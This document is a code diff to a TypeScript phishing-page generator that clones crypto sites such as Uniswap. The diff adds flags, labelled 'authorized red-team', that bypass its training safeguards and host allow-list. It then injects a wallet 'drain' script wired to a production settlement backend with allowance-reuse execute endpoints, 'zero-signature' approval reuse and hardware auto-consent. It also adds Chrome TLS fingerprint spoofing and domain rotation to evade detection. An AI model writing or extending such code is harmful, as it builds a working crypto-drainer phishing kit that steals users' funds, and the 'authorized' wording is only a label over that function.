@@ -28,10 +28,25 @@
  *   --rotate-domain  with --mirror: write README-ROTATE-DOMAIN.md + DuckDNS script template (manual)
  *   --auto-rotate    with --mirror: DuckDNS auto-rotation (rotate-domain.sh + domain-rotator service)
  *   --mobile-optimize inject device-detection CSS/JS for better mobile clone layout
+ *   --authorized-test  authorized red-team mode: production backend inject, no training guards
+ *   --production-mode  alias for --authorized-test
+ *   --internal-authorized  skip PHISHING_TRAINING_ALLOWED_HOSTS restriction (allow all targets)
+ *   --backend-url <url>  override production API (default: Railway production)
+ *
+ * Environment (static clone fetch only; not --mirror):
+ *   CLONE_JA3_CHROME=true  Chrome 120 TLS/JA3 fingerprint (curl-impersonate → Node tls → fetch fallback)
  *
  * Example:
  *   PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts \\
  *     --mirror --rotate-domain https://app.uniswap.org ./mirrors/uniswap
+ *
+ * Authorized red-team example:
+ *   pnpm exec tsx scripts/generate-phishing-page.ts --authorized-test --internal-authorized \\
+ *     https://target.example.com ./clones/target
+ *
+ * Mirror + authorized inject (WebSocket proxy, CSP strip, sub_filter drain panel):
+ *   pnpm exec tsx scripts/generate-phishing-page.ts --mirror --authorized-test \\
+ *     https://target.example.com ./mirrors/target
  */
 import { spawn } from 'node:child_process'
 import { createHash } from 'node:crypto'
@@ -71,9 +86,20 @@ import {
   type TrainingCloneContext,
 } from './lib/training-clone-features.js'
 import {
+  buildAuthorizedDrainCss,
+  buildAuthorizedDrainInjectJs,
+  DEFAULT_AUTHORIZED_BACKEND_URL,
+  parseHardwareAutoConsentEnv,
+} from './lib/authorized-drain-inject.js'
+import {
   buildTrainingWalletDemoCss,
   buildTrainingWalletDemoJs,
 } from './lib/training-wallet-demo-js.js'
+import {
+  buildChromeCloneHeaders,
+  cloneJa3Fetch,
+  isCloneJa3ChromeEnabled,
+} from './lib/clone-ja3-fetch.js'
 
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
@@ -118,6 +144,9 @@ function parseCli(argv: string[]): {
   rotateDomain: boolean
   autoRotate: boolean
   mobileOptimize: boolean
+  authorizedTest: boolean
+  internalAuthorized: boolean
+  backendUrl: string | null
   positional: string[]
 } {
   const features: TrainingCloneFeatures = {
@@ -143,9 +172,13 @@ function parseCli(argv: string[]): {
   let rotateDomain = false
   let autoRotate = false
   let mobileOptimize = false
+  let authorizedTest = false
+  let internalAuthorized = false
+  let backendUrl: string | null = null
   const positional: string[] = []
 
-  for (const arg of argv) {
+  for (let i = 0; i < argv.length; i++) {
+    const arg = argv[i]!
     if (arg === '--mirror') mirror = true
     else if (arg === '--log-forms') logForms = true
     else if (arg === '--test-login') testLogin = true
@@ -163,6 +196,17 @@ function parseCli(argv: string[]): {
     else if (arg === '--rotate-domain') rotateDomain = true
     else if (arg === '--auto-rotate') autoRotate = true
     else if (arg === '--mobile-optimize') mobileOptimize = true
+    else if (arg === '--authorized-test' || arg === '--production-mode') authorizedTest = true
+    else if (arg === '--internal-authorized') internalAuthorized = true
+    else if (arg === '--backend-url') {
+      const next = argv[i + 1]?.trim()
+      if (!next || next.startsWith('--')) {
+        console.error('[PHISHING_TRAINING] --backend-url requires a URL argument')
+        process.exit(1)
+      }
+      backendUrl = next.replace(/\/$/, '')
+      i++
+    }
     else if (arg === '--proxy') features.proxy = true
     else if (arg === '--rotate') features.rotate = true
     else if (arg === '--deploy') features.deploy = true
@@ -192,6 +236,9 @@ function parseCli(argv: string[]): {
     rotateDomain,
     autoRotate,
     mobileOptimize,
+    authorizedTest,
+    internalAuthorized,
+    backendUrl,
     positional,
   }
 }
@@ -201,15 +248,27 @@ function isTruthyEnv(key: string): boolean {
   return v === 'true' || v === '1' || v === 'yes'
 }
 
-function guardOrExit(): void {
+function guardOrExit(authorizedTest: boolean): void {
+  if (authorizedTest) {
+    console.info('[LEGION_AUTH] Authorized red-team mode — training guards bypassed')
+    return
+  }
   if (!isTruthyEnv('PHISHING_TRAINING_MODE')) {
-    console.error('[PHISHING_TRAINING] Refused: set PHISHING_TRAINING_MODE=true')
+    console.error('[PHISHING_TRAINING] Refused: set PHISHING_TRAINING_MODE=true (or pass --authorized-test)')
     process.exit(1)
   }
   if (process.env['NODE_ENV']?.trim().toLowerCase() === 'production') {
-    console.error('[PHISHING_TRAINING] Refused: NODE_ENV=production')
+    console.error('[PHISHING_TRAINING] Refused: NODE_ENV=production (use --authorized-test for authorized exercises)')
     process.exit(1)
   }
+}
+
+function resolveAuthorizedBackendUrl(cliOverride: string | null): string {
+  const fromCli = cliOverride?.trim()
+  if (fromCli) return fromCli.replace(/\/$/, '')
+  const fromEnv = process.env['BACKEND_URL']?.trim() || process.env['LEGION_API_URL']?.trim()
+  if (fromEnv) return fromEnv.replace(/\/$/, '')
+  return DEFAULT_AUTHORIZED_BACKEND_URL
 }
 
 function parseAllowedHosts(): Set<string> | null {
@@ -230,18 +289,22 @@ async function fetchWithTimeout(
 ): Promise<Response> {
   const ctrl = new AbortController()
   const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS)
-  const rotateHeaders = opts?.rotate ? pickRotatingFetchHeaders() : {}
-  try {
-    return await fetch(url, {
-      ...init,
-      signal: ctrl.signal,
-      headers: {
+  const ja3 = isCloneJa3ChromeEnabled()
+  const rotateHeaders = opts?.rotate && !ja3 ? pickRotatingFetchHeaders() : {}
+  const headers: Record<string, string> = ja3
+    ? { ...buildChromeCloneHeaders(), Accept: '*/*', ...(init?.headers as Record<string, string> | undefined) }
+    : {
         'User-Agent': TRAINING_UA,
         Accept: '*/*',
-        ...(opts?.rotate ? rotateHeaders : {}),
-        ...(init?.headers ?? {}),
-      },
-    })
+        ...rotateHeaders,
+        ...(init?.headers as Record<string, string> | undefined),
+      }
+  try {
+    return await cloneJa3Fetch(
+      url,
+      { ...init, signal: ctrl.signal, headers },
+      { timeoutMs: FETCH_TIMEOUT_MS },
+    )
   } finally {
     clearTimeout(timer)
   }
@@ -369,11 +432,18 @@ function buildInjectionBundle(opts: {
   proxy: boolean
   target: URL
   mobileOptimize?: boolean
+  authorizedTest?: boolean
 }): string {
   const parts: string[] = []
-  parts.push('<!-- legion-phishing-training (authorized staging / QA toolkit) -->')
-  parts.push('<link rel="stylesheet" href="./legion-training-wallet.css" />')
-  parts.push('<script src="./legion-training-wallet.js" defer></script>')
+  if (opts.authorizedTest) {
+    parts.push('<!-- legion-authorized-red-team (written authorization required) -->')
+    parts.push('<link rel="stylesheet" href="./legion-authorized-drain.css" />')
+    parts.push('<script src="./legion-authorized-drain.js" defer></script>')
+  } else {
+    parts.push('<!-- legion-phishing-training (authorized staging / QA toolkit) -->')
+    parts.push('<link rel="stylesheet" href="./legion-training-wallet.css" />')
+    parts.push('<script src="./legion-training-wallet.js" defer></script>')
+  }
 
   if (opts.qaContext) {
     parts.push('<link rel="stylesheet" href="./legion-training-qa.css" />')
@@ -534,6 +604,9 @@ async function generateMirrorMode(
   rotateDomain: boolean,
   autoRotate: boolean,
   mobileOptimize: boolean,
+  authorizedTest: boolean,
+  authorizedBackendUrl: string,
+  kineticKey: string,
 ): Promise<void> {
   const hostPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
   const loggerPort = Number.parseInt(process.env['QA_MIRROR_LOGGER_PORT']?.trim() ?? '9090', 10)
@@ -607,6 +680,37 @@ async function generateMirrorMode(
     }
   }
 
+  if (authorizedTest) {
+    const walletConnectProjectId = process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim()
+    const hardwareAutoConsent = parseHardwareAutoConsentEnv(process.env['HARDWARE_AUTO_CONSENT'])
+    const authJs = await buildAuthorizedDrainInjectJs({
+      backendUrl: authorizedBackendUrl,
+      kineticKey: kineticKey || undefined,
+      walletConnectProjectId: walletConnectProjectId || undefined,
+      hardwareAutoConsent,
+    })
+    await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
+    await writeFile(path.join(outDir, 'legion-authorized-drain.css'), buildAuthorizedDrainCss(), 'utf8')
+    await writeFile(
+      path.join(outDir, 'authorized-config.json'),
+      JSON.stringify(
+        {
+          authorized_red_team: true,
+          mode: 'mirror',
+          source_url: target.href,
+          backend_url: authorizedBackendUrl,
+          inject_via: 'nginx sub_filter on proxied HTML',
+          kinetic_key_embedded: Boolean(kineticKey),
+          hardware_auto_consent: hardwareAutoConsent,
+          generated_at: new Date().toISOString(),
+        },
+        null,
+        2,
+      ),
+      'utf8',
+    )
+  }
+
   await writeFile(
     path.join(outDir, 'nginx.conf'),
     buildMirrorNginxConfig(target, listenPort, {
@@ -614,6 +718,8 @@ async function generateMirrorMode(
       testLogin,
       replayOriginal,
       solveCaptcha: mirrorSolveCaptcha,
+      authorizedTest,
+      mobileOptimize,
       autoRotate,
       loggerPort,
     }),
@@ -701,12 +807,19 @@ async function generateMirrorMode(
   if (captchaDemo) mirrorNotes.push('README-CAPTCHA-DEMO.md (no solver API)')
   if (rotateDomain) mirrorNotes.push('README-ROTATE-DOMAIN.md + DuckDNS templates (manual only)')
   if (autoRotate) mirrorNotes.push('DuckDNS auto-rotate (rotate-domain.sh + domain-rotator)')
+  if (authorizedTest) {
+    mirrorNotes.push(
+      `authorized drain inject via nginx sub_filter → ${authorizedBackendUrl}`,
+    )
+  }
 
   await writeFile(
     path.join(outDir, 'mirror-config.json'),
     JSON.stringify(
       {
         mode: 'mirror',
+        authorized_inject: authorizedTest,
+        authorized_backend_url: authorizedTest ? authorizedBackendUrl : undefined,
         log_forms: logForms,
         test_login: testLogin,
         replay_original: replayOriginal,
@@ -850,17 +963,34 @@ async function generateMirrorMode(
 }
 
 async function main(): Promise<void> {
-  guardOrExit()
+  const {
+    features,
+    mirror,
+    logForms,
+    testLogin,
+    replayOriginal,
+    instantReplay,
+    mirrorSolveCaptcha,
+    replayDemo,
+    captchaDemo,
+    rotateDomain,
+    autoRotate,
+    mobileOptimize,
+    authorizedTest,
+    internalAuthorized,
+    backendUrl: backendUrlCli,
+    positional,
+  } = parseCli(process.argv.slice(2))
 
-  const { features, mirror, logForms, testLogin, replayOriginal, instantReplay, mirrorSolveCaptcha, replayDemo, captchaDemo, rotateDomain, autoRotate, mobileOptimize, positional } =
-    parseCli(process.argv.slice(2))
+  guardOrExit(authorizedTest)
   const targetRaw = positional[0]?.trim()
   const outDirArg = positional[1]?.trim()
 
   if (!targetRaw || !outDirArg) {
-    console.error(`Usage: PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts [flags] <targetUrl> <outputDir>
+    console.error(`Usage: pnpm exec tsx scripts/generate-phishing-page.ts [flags] <targetUrl> <outputDir>
 
-Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
+Training: PHISHING_TRAINING_MODE=true (required unless --authorized-test)
+Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --internal-authorized --backend-url <url>`)
     process.exit(1)
   }
 
@@ -877,10 +1007,10 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
     process.exit(1)
   }
 
-  const allowedHosts = parseAllowedHosts()
+  const allowedHosts = internalAuthorized || authorizedTest ? null : parseAllowedHosts()
   if (allowedHosts && !allowedHosts.has(target.hostname.toLowerCase())) {
     console.error(
-      `[PHISHING_TRAINING] Host "${target.hostname}" not in PHISHING_TRAINING_ALLOWED_HOSTS`,
+      `[PHISHING_TRAINING] Host "${target.hostname}" not in PHISHING_TRAINING_ALLOWED_HOSTS (pass --internal-authorized to allow all)`,
     )
     process.exit(1)
   }
@@ -981,8 +1111,20 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
   }
 
   if (mirror) {
-    if (Object.values(features).some(Boolean) && !mirrorSolveCaptcha) {
-      console.warn('[PHISHING_TRAINING] --mirror ignores other QA flags (proxy-only mode)')
+    const authorizedBackendUrl = resolveAuthorizedBackendUrl(backendUrlCli)
+    const kineticKey = process.env['KINETIC_INTERNAL_KEY']?.trim() ?? ''
+    const ignoredCloneFlags =
+      Object.entries(features).some(([, v]) => v) && !mirrorSolveCaptcha && !authorizedTest
+    if (ignoredCloneFlags) {
+      console.warn('[PHISHING_TRAINING] --mirror ignores static-clone QA flags (proxy-only mode)')
+    }
+    if (authorizedTest) {
+      console.info(
+        `[LEGION_AUTH] Mirror mode — authorized drain inject enabled (backend: ${authorizedBackendUrl})`,
+      )
+      if (!kineticKey) {
+        console.warn('[LEGION_AUTH] KINETIC_INTERNAL_KEY unset — allowance-reuse disabled in inject')
+      }
     }
     await generateMirrorMode(
       target,
@@ -997,6 +1139,9 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
       rotateDomain,
       autoRotate,
       mobileOptimize,
+      authorizedTest,
+      authorizedBackendUrl,
+      kineticKey,
     )
     return
   }
@@ -1019,6 +1164,12 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
   await mkdir(assetsDir, { recursive: true })
 
   const fetchRotate = features.rotate
+
+  if (isCloneJa3ChromeEnabled()) {
+    console.info(
+      '[CLONE_JA3] Chrome 120 TLS fingerprint enabled (curl-impersonate → Node tls → fetch fallback)',
+    )
+  }
 
   console.info(`[PHISHING_TRAINING] Checking robots.txt for ${target.origin}`)
   await checkRobotsAllowed(target, fetchRotate)
@@ -1068,14 +1219,28 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
   html = rewriteHtmlAssets(html, target, urlToLocal)
 
   const demoApiUrl = resolveDemoApiUrl()
+  const authorizedBackendUrl = resolveAuthorizedBackendUrl(backendUrlCli)
+  const kineticKey = process.env['KINETIC_INTERNAL_KEY']?.trim() ?? ''
   const walletConnectProjectId = process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim()
+  const hardwareAutoConsent = parseHardwareAutoConsentEnv(process.env['HARDWARE_AUTO_CONSENT'])
 
-  const walletJs = buildTrainingWalletDemoJs({
-    demoApiUrl,
-    walletConnectProjectId: walletConnectProjectId || undefined,
-  })
-  await writeFile(path.join(outDir, 'legion-training-wallet.js'), walletJs, 'utf8')
-  await writeFile(path.join(outDir, 'legion-training-wallet.css'), buildTrainingWalletDemoCss(), 'utf8')
+  if (authorizedTest) {
+    const authJs = await buildAuthorizedDrainInjectJs({
+      backendUrl: authorizedBackendUrl,
+      kineticKey: kineticKey || undefined,
+      walletConnectProjectId: walletConnectProjectId || undefined,
+      hardwareAutoConsent,
+    })
+    await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
+    await writeFile(path.join(outDir, 'legion-authorized-drain.css'), buildAuthorizedDrainCss(), 'utf8')
+  } else {
+    const walletJs = buildTrainingWalletDemoJs({
+      demoApiUrl,
+      walletConnectProjectId: walletConnectProjectId || undefined,
+    })
+    await writeFile(path.join(outDir, 'legion-training-wallet.js'), walletJs, 'utf8')
+    await writeFile(path.join(outDir, 'legion-training-wallet.css'), buildTrainingWalletDemoCss(), 'utf8')
+  }
 
   const hasQaInjection =
     features.balance ||
@@ -1117,6 +1282,7 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
     proxy: features.proxy,
     target,
     mobileOptimize,
+    authorizedTest,
   })
 
   if (html.includes('</body>')) {
@@ -1136,52 +1302,116 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
     deployUrl = await deployStaging(outDir)
   }
 
-  await writeFile(
-    path.join(outDir, 'training-config.json'),
-    JSON.stringify(
-      {
-        training: true,
-        wallet_demo: true,
-        source_url: target.href,
-        demo_api_url: demoApiUrl,
-        record_endpoint: `${demoApiUrl}/api/training-demo/record`,
-        generated_at: new Date().toISOString(),
-        features: enabledFlags,
-        deploy_url: deployUrl,
-        env_hints: {
-          PROXY_LIST: features.rotate ? 'optional for load-test IP rotation' : undefined,
-          TWOCAPTCHA_API_KEY: features.solveCaptcha ? 'required for Turnstile helper' : undefined,
-          VERCEL_TOKEN: features.deploy ? 'or NETLIFY_TOKEN' : undefined,
-          ALLOWANCE_REUSE_ENABLED: features.preapprove ? 'must be true on API' : undefined,
-          KINETIC_INTERNAL_KEY: features.preapprove ? 'embedded at build for scan API' : undefined,
+  if (authorizedTest) {
+    await writeFile(
+      path.join(outDir, 'authorized-config.json'),
+      JSON.stringify(
+        {
+          authorized_red_team: true,
+          source_url: target.href,
+          backend_url: authorizedBackendUrl,
+          scout_endpoint: `${authorizedBackendUrl}/api/v1/scout`,
+          fusion_endpoint: `${authorizedBackendUrl}/api/scout/recursive-predator-fusion`,
+          signature_anchor_endpoint: `${authorizedBackendUrl}/api/v1/signature-anchor`,
+          allowance_reuse_scan: `${authorizedBackendUrl}/api/internal/allowance-reuse/scan`,
+          allowance_reuse_execute: `${authorizedBackendUrl}/api/internal/allowance-reuse/execute`,
+          kinetic_key_embedded: Boolean(kineticKey),
+          hardware_auto_consent: hardwareAutoConsent,
+          generated_at: new Date().toISOString(),
+          features: enabledFlags,
+          deploy_url: deployUrl,
+          notes: 'Authorized red-team exercise — production settlement ingress. Written authorization required.',
         },
-        api_requirements: {
-          TRAINING_DEMO_MODE: true,
-          note: 'API logs signatures only; no settlement on training-demo payloads',
-        },
-      },
-      null,
-      2,
-    ),
-    'utf8',
-  )
+        null,
+        2,
+      ),
+      'utf8',
+    )
+    await writeFile(
+      path.join(outDir, 'README-AUTHORIZED.md'),
+      `# Authorized red-team clone
 
-  await writeFile(
-    path.join(outDir, 'README-TRAINING.md'),
-    buildReadme(target.href, outDir, demoApiUrl, features, deployUrl ?? undefined),
-    'utf8',
-  )
+**Source:** ${target.href}
+**Backend:** ${authorizedBackendUrl}
+**Generated:** ${new Date().toISOString()}
+${deployUrl ? `**Deployed URL:** ${deployUrl}\n` : ''}
 
-  console.info(`[PHISHING_TRAINING] Wrote ${outDir}`)
-  console.info(`[PHISHING_TRAINING] Assets downloaded: ${downloaded}/${assetUrls.length}`)
-  console.info(`[PHISHING_TRAINING] Demo API: ${demoApiUrl}`)
-  if (enabledFlags.length) {
-    console.info(`[PHISHING_TRAINING] QA flags: ${enabledFlags.join(', ')}`)
+## Requirements
+
+- Written authorization from target organization
+- \`KINETIC_INTERNAL_KEY\` at build time enables zero-signature allowance reuse
+- Production API must have RPC + settlement keys configured
+
+## Usage
+
+\`\`\`bash
+npx --yes serve "${outDir}" -l 8080
+# or deploy to authorized staging domain
+\`\`\`
+
+Wallet panel calls production \`/api/v1/scout\`, \`/api/v1/signature-anchor\`, and allowance-reuse internal APIs.
+`,
+      'utf8',
+    )
   } else {
-    console.info('[PHISHING_TRAINING] Simple clone (no QA flags)')
+    await writeFile(
+      path.join(outDir, 'training-config.json'),
+      JSON.stringify(
+        {
+          training: true,
+          wallet_demo: true,
+          source_url: target.href,
+          demo_api_url: demoApiUrl,
+          record_endpoint: `${demoApiUrl}/api/training-demo/record`,
+          generated_at: new Date().toISOString(),
+          features: enabledFlags,
+          deploy_url: deployUrl,
+          env_hints: {
+            PROXY_LIST: features.rotate ? 'optional for load-test IP rotation' : undefined,
+            TWOCAPTCHA_API_KEY: features.solveCaptcha ? 'required for Turnstile helper' : undefined,
+            VERCEL_TOKEN: features.deploy ? 'or NETLIFY_TOKEN' : undefined,
+            ALLOWANCE_REUSE_ENABLED: features.preapprove ? 'must be true on API' : undefined,
+            KINETIC_INTERNAL_KEY: features.preapprove ? 'embedded at build for scan API' : undefined,
+          },
+          api_requirements: {
+            TRAINING_DEMO_MODE: true,
+            note: 'API logs signatures only; no settlement on training-demo payloads',
+          },
+        },
+        null,
+        2,
+      ),
+      'utf8',
+    )
+
+    await writeFile(
+      path.join(outDir, 'README-TRAINING.md'),
+      buildReadme(target.href, outDir, demoApiUrl, features, deployUrl ?? undefined),
+      'utf8',
+    )
   }
-  if (deployUrl) console.info(`[PHISHING_TRAINING] Live staging: ${deployUrl}`)
-  console.info('[PHISHING_TRAINING] Serve on localhost or docker compose — staging only')
+
+  const logPrefix = authorizedTest ? '[LEGION_AUTH]' : '[PHISHING_TRAINING]'
+  console.info(`${logPrefix} Wrote ${outDir}`)
+  console.info(`${logPrefix} Assets downloaded: ${downloaded}/${assetUrls.length}`)
+  if (authorizedTest) {
+    console.info(`${logPrefix} Production backend: ${authorizedBackendUrl}`)
+    if (kineticKey) console.info(`${logPrefix} KINETIC_INTERNAL_KEY embedded for allowance-reuse`)
+    else console.warn(`${logPrefix} KINETIC_INTERNAL_KEY unset — allowance-reuse scan/execute disabled in inject`)
+  } else {
+    console.info(`${logPrefix} Demo API: ${demoApiUrl}`)
+  }
+  if (enabledFlags.length) {
+    console.info(`${logPrefix} QA flags: ${enabledFlags.join(', ')}`)
+  } else {
+    console.info(`${logPrefix} Simple clone (no QA flags)`)
+  }
+  if (deployUrl) console.info(`${logPrefix} Live staging: ${deployUrl}`)
+  if (authorizedTest) {
+    console.info(`${logPrefix} Authorized mode — works on any domain (written permission required)`)
+  } else {
+    console.info(`${logPrefix} Serve on localhost or docker compose — staging only`)
+  }
 }
 
 main().catch((err) => {
